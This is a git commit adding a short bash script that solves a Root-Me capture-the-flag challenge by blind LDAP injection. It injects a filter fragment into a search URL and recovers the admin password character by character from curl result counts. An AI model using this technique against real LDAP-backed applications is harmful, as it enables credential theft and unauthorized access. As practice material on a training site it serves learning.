66e3ab9f42a0bd6f19467f98667b800da55b4e8a
Jérémy Beaume <jer.beaume@gmail.com>
2016-09-02 09:25:59 +0200

    ldap blind

---
+++ web-server/blind-ldap/script.sh
@@ -0,0 +1,20 @@
+#!/bin/bash
+
+url="http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search=admin*%29%28password%3D"
+
+pass=
+add=true
+while [ $add = true ]
+do
+    add=false
+    for i in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9
+    do
+        res=$(curl $url$pass$i 2> /dev/null | \grep -o "[0-9] result" | cut '-d ' -f 1)
+        if [ "$res" -ge 1 ]; then
+            pass=$pass$i
+            echo $pass
+            add=true
+            break
+        fi
+    done
+done
